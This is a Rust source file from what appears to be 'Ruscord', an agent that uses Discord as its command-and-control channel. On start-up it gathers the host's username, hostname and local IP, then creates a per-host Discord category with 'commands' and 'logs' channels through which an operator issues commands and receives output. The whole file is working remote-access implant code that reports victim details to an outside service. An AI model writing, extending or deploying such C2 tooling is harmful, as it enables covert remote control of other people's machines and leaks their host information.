use std::{
    fmt::Display,
    hash::{DefaultHasher, Hash, Hasher},
};

use poise::serenity_prelude::*;
use tokio::time::Instant;
use uuid::Uuid;

use crate::{utils::channel_manager::ChannelManager, RuscordResult};

mod config_data {
    include!(concat!(env!("OUT_DIR"), "/ruscord_values.rs"));
}

pub use config_data::*;
const UUID: Uuid =
    uuid::Uuid::from_bytes(*include_bytes!(concat!(env!("OUT_DIR"), "/ruscord.uuid")));

#[derive(Debug)]
pub struct HostDetails {
    /// Unique identifier for this agent instance
    pub id: Uuid,
    /// Username of the user running the agent
    pub username: String,
    /// Hostname of the machine running the agent
    pub hostname: String,
    /// Local IP address of the machine running the agent
    pub ip: String,
    /// Time the agent was initialized
    pub init_time: Instant,
}

/// Main configuration structure for the agent
#[derive(Debug)]
pub struct AgentConfig {
    /// Miscellaneous runtime information about the agent
    pub host_details: HostDetails,
    /// The channel ID for the category channel
    pub category_channel_id: ChannelManager,
    /// The channel ID for the command channel
    pub command_channel_id: ChannelManager,
    /// The channel ID for the log channel
    pub log_channel_id: ChannelManager,
}

impl AgentConfig {
    /// Loads the agent configuration and initializes runtime information.
    ///
    /// This function:
    /// - Retrieves the agent's UUID
    /// - Gets system information like hostname, IP, and username
    /// - Creates Discord channels for the agent using a hash of the host details
    ///
    /// # Arguments
    /// * `ctx` - The Discord context used to create/find channels
    ///
    /// # Returns
    /// * `RuscordResult<Self>` - The initialized agent configuration
    pub async fn load(ctx: &Context) -> RuscordResult<Self> {
        let init_time = Instant::now();
        let id = UUID;
        let hostname = whoami::fallible::hostname().unwrap_or(String::from("unknown"));
        let ip = local_ip_address::local_ip()
            .map(|e| e.to_string())
            .unwrap_or(String::from("unknown ip"));
        let username = whoami::fallible::username().unwrap_or(String::from("unknown"));

        let host_details = HostDetails {
            id,
            hostname,
            ip,
            username,
            init_time,
        };
        let hasher = &mut DefaultHasher::new();
        host_details.hash(hasher);
        let host_details_hash = hasher.finish();
        let (category_channel_id, command_channel_id, log_channel_id) =
            Self::load_channels(ctx, host_details_hash).await?;
        Ok(Self {
            host_details,
            category_channel_id,
            command_channel_id,
            log_channel_id,
        })
    }

    /// Loads the category, commands and logs channels
    async fn load_channels(
        ctx: &Context,
        host_details_hash: u64,
    ) -> RuscordResult<(ChannelManager, ChannelManager, ChannelManager)> {
        let hash_str = host_details_hash.to_string();
        let category_channel_id = ChannelManager::find_or_create_channel(
            ctx,
            hash_str.as_str(),
            ChannelType::Category,
            None,
            None,
        )
        .await?;

        let commands_channel_id = ChannelManager::find_or_create_channel(
            ctx,
            "commands",
            ChannelType::Text,
            category_channel_id.id(),
            "Enter in comands for the agent here",
        )
        .await?;

        let logs_channel_id = ChannelManager::find_or_create_channel(
            ctx,
            "logs",
            ChannelType::Text,
            category_channel_id.id(),
            "A channel to store all logs for the agent",
        )
        .await?;

        Ok((category_channel_id, commands_channel_id, logs_channel_id))
    }

    /// Checks if the given channel ID is a valid channel for the agent.
    pub fn check(&self, invocation_cid: ChannelId) -> bool {
        self.command_channel_id.id() == invocation_cid || self.log_channel_id.id() == invocation_cid
    }

    /// Gets the channel manager for the given channel ID
    pub fn get_manager_for_id(&mut self, id: ChannelId) -> Option<&mut ChannelManager> {
        if self.command_channel_id.id() == id {
            Some(&mut self.command_channel_id)
        } else if self.log_channel_id.id() == id {
            Some(&mut self.log_channel_id)
        } else if self.category_channel_id.id() == id {
            Some(&mut self.category_channel_id)
        } else {
            None
        }
    }
}

impl Display for HostDetails {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let duration = self.init_time.elapsed();
        let init_datetime = chrono::Local::now() - duration;

        write!(
            f,
            "\tIP: {}\n\tUsername: {}\n\tHostname: {}\n\tInit time: {}",
            self.ip,
            self.username,
            self.hostname,
            init_datetime.to_rfc2822()
        )
    }
}
impl Hash for HostDetails {
    fn hash<H: Hasher>(&self, state: &mut H) {
        format!("{}/{}@{}", self.username, self.hostname, self.ip).hash(state);
    }
}

impl Display for AgentConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        writeln!(f, "Host Details:")?;
        Display::fmt(&self.host_details, f)?;
        writeln!(
            f,
            "\nCategory channel ID: {}\nCommand channel ID: {}\nLog channel ID: {}",
            self.category_channel_id.id(),
            self.command_channel_id.id(),
            self.log_channel_id.id()
        )
    }
}

impl Hash for AgentConfig {
    fn hash<H: Hasher>(&self, state: &mut H) {
        self.host_details.hash(state);
    }
}
